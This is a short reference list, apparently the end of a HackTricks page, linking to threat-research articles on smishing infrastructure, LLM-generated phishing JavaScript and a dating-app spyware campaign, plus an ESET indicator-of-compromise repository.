- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
